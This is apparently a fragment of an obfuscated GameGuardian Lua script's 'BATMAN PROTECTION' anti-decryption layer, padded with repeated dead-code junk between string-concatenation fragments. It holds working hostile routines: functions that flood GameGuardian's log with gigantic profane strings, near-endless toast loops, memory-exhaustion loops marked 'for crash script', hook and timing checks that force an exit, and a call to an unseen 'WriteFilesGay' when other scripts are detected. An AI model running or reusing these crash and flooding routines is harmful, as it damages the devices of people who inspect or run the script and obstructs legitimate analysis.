  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
  function gu2()
  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
 c = tostring(_ENV.gg)
for k in c:gmatch("%s[@]?(/.-):") do
if k ~= gg.getFile() then
WriteFilesGay()
end
end
end
gu2()


  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[


function Big_log()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end


  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log2()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log3()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log4()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log5()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log6()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log7()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end


  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log8()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log9()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function Big_log10()
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

  function checkFunctions()
  local Lock = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src
  }
  for i, v in pairs(Lock) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
      for i = 1, 999999999 do
        gg.toast(" BATMAN PROTECTION ")
      end
      return
    end
  end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function checkExecutionTime()
  local a = os.time()
  for i = 1, 100 do
    load("💩🥳 Im Corona Lol")
  end
  local b = os.time()
  if b - a > 5 then
    gg.alert("noob decrypt")
    os.exit() 
end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

Big_log()
Big_log2()
Big_log3()
--Big_log4()
--Big_log5()
--Big_log6()
--Big_log7()
--Big_log8()
--Big_log9()
--Big_log10()
checkFunctions()
checkExecutionTime()

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

--for crash script 
local function ProcessSpam()

    local SpamTable = {}
    local counter, toStr = 0, tostring

    local function GenerateSequence()
        local result = ""
        while counter < 100 do
            result = result .. toStr(counter * counter)
            counter = counter + 1
        end
        return result
    end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function complexLoop()
    local t = {}
    
    while true do
        for i = 1, 20000 do  
            t[i] = {}
            for j = 1, 200 do  
                t[i][j] = string.rep("B", 2048)  
            end
        end
        
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
    end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function createMassiveData()
    
    local t = {}
    
    while true do
             for i = 1, 100000 do
            t[i] = {}
            for j = 1, 200 do
                t[i][j] = string.rep("D", 8096)  
            end
        end
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
         complexLoop() 
    end
end

while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end

	if true then
		if string.match('/' .. tostring(os.time()), '/([^/]+)$') ~= tostring(os.time()) then
			while true do
				if true then
				ProcessSpam()
					createMassiveData()
					antilog()
					os.exit()
				end
				if false then
				end
			end
		end
	end
	
	loadfile = loadfile
    load = load
    loadfile(gg.getFile()) 
    load(string.dump(load("os.exit()"),false,false)) 
    io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") 

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function isFunctionSafe(func)
    local info = debug.getinfo(func)
    
    if type(func) == "function" and func ~= debug.getinfo then
        if info.short_src ~= "[Java]" or info.source ~= "=[Java]" or info.what ~= "Java" or
           info.namewhat ~= "" or info.linedefined ~= -1 or info.lastlinedefined ~= -1 or
           info.currentline ~= -1 or type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    elseif func == debug.getinfo then
        if type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    end
    return true
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function verifyLibraries()
    local libraries = {"gg", "os", "io", "debug", "math", "string", "table", "bit32", "utf8"}
    
    for _, lib in ipairs(libraries) do
        local init = _ENV[lib]
        if init and type(init) == "table" then
            for _, func in pairs(init) do
                if type(func) == "function" and not isFunctionSafe(func) then
                    return
                end
            end
        end
    end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function additionalChecks()
    local Lock = {
        debug.getinfo(gg.toast).short_src,
        debug.getinfo(gg.getResults).short_src,
        debug.getinfo(gg.getValues).short_src,
        debug.getinfo(os.exit).short_src,
        debug.getinfo(gg.refineNumber).short_src,
        debug.getinfo(gg.refineAddress).short_src,
        debug.getinfo(gg.alert).short_src
    }
    for _, v in ipairs(Lock) do
        if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
            return
        end
    end
end

